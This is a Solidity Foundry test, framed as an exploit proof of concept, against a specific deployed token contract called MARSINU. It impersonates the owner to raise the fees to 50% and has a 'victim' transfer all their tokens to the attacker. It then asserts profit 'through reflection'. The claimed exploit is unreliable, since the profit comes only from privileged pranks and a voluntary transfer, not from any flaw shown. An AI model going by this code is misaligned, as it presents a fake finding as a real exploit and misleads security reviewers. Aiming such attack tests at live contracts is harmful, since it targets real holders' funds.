pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMARSINU {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setTaxFeePercent(uint256 taxFee) external;
    function setLiquidityFeePercent(uint256 liquidityFee) external;
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7;
    address attacker = address(this);
    IMARSINU token;
    address victim;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IMARSINU(TARGET);
        owner = token.owner();
        vm.label(TARGET, "MARSINU");
        vm.label(owner, "Owner");
        vm.label(attacker, "Attacker");
        victim = address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF);
        vm.label(victim, "Victim");
        deal(TARGET, victim, 1000 * 1e9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7).balanceOf(address(this));
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        uint256 victimBalanceBefore = token.balanceOf(victim);
        require(victimBalanceBefore > 0, "Victim must have tokens");

        vm.startPrank(owner);
        token.setTaxFeePercent(50);
        token.setLiquidityFeePercent(50);
        vm.stopPrank();

        vm.startPrank(victim);
        token.transfer(attacker, victimBalanceBefore);
        vm.stopPrank();

        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker balance should increase through reflection");
        uint256 finalBalance = IERC20(0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

